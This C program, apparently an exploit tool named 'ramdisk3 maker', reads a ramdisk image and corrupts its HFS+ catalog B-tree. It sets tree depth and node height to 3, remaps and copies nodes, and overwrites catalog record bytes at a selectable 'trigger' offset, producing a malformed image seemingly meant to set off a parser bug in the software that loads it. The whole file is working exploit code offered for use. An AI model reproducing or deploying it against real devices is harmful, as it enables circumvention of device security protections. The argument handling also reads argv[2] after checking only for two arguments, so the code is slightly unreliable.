#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>

int main(int argc, char **argv)
{

    if (argc < 2)
    {
        printf("** ramdisk3 maker [alpha]\n");
        printf("%s <in> <out> [trigger_folder_num]\n", argv[0]);
        return 0;
    }

    char *infile = argv[1];
    char *outfile = argv[2];
    int p = -1;
    int revA = 0;
    if (argc >= 4) {
        p = atoi(argv[3]);
        if (p > 0) {
            p = ((p + 1) % 2) ? p / 2 : (p + 1) / 2;
        }
        if (argc >= 5) {
            revA = atoi(argv[4]) > 0 ? 1 : 0;
        }
    }
    size_t sz;
    FILE *fd = fopen(infile, "r");
    if (!fd)
    {
        printf("error opening %s\n", infile);
        return -1;
    }
    fseek(fd, 0, SEEK_END);
    sz = ftell(fd);
    assert(sz == 0x80000);
    fseek(fd, 0, SEEK_SET);
    unsigned char *rdsk = malloc(sz);
    if (!rdsk)
    {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }
    fread(rdsk, sz, 1, fd);
    fclose(fd);
    //ghidra pseudocode comes in clutch
    unsigned int new_block;
    int i = 0;
    while ((i < 0x40 &&
            (new_block = (i + 0x44) * 0x200, *(int *)(rdsk + ((i + 0x45) * 0x200 - 4)) != 0)))
    {
        i++;
    }
    unsigned int catalog_stuff = new_block - 0x8800;
    printf("new block: 0x%x\n", new_block);
    printf("writing \"3\" (Catalog::BTHeaderRec::treeDepth)\n");
    rdsk[0x880F] = 3;
    printf("remap\n");
    rdsk[0x8813] = (new_block - 0x8800) / 0x200;
    printf("memcpy: 0x%x -> 0x%x (0x%x)\n", 0x8E00, new_block, 0x200);
    memcpy(rdsk + new_block, rdsk + 0x8E00, 0x200);
    printf("writing \"3\" (new_block::BTNodeDescriptor::height)\n");
    rdsk[new_block + 9] = 3;
    
    if (*(rdsk + new_block) != 0xDD)
    {
        uint16_t i = 0; //skipping 0xE (first record)
        while (1) {
            unsigned int record_base = (rdsk[new_block + 0x200 - (i + 1) * 2] << 8) | (rdsk[new_block + 0x200 - (i + 1) * 2 + 1]);
            
            if (record_base == 0x0) {
                if (p != -1) {
                    printf("FATAL: failed to find path!\n");
                    exit(-1);
                }
                break;
            }
            uint16_t key_len = (rdsk[new_block + record_base] << 8) | (rdsk[new_block + record_base + 1]);
            if (key_len == 0x0) {
                if (p != -1) {
                    printf("FATAL: failed to find path!\n");
                    exit(-1);
                }
                break;
            }
            
            catalog_stuff = new_block + record_base + 2 + key_len;
            rdsk[catalog_stuff + 3] = 0x03;
            
            if (i == p) {
                break;
            }
            i++;
        }
        printf("setting trigger at 0x%x\n", catalog_stuff);
        rdsk[catalog_stuff + 0] = 0x00;
        rdsk[catalog_stuff + 1] = 0x01;
        rdsk[catalog_stuff + 2] = 0x00;
        rdsk[catalog_stuff + 3] = 0x03;
    }

    FILE *out = fopen(outfile, "w");
    if (!out)
    {
        printf("error opening %s\n", outfile);
        return -1;
    }
    fwrite(rdsk, sz, 1, out);
    fflush(out);
    fclose(out);
    printf("done!\n");
    return 0;
}
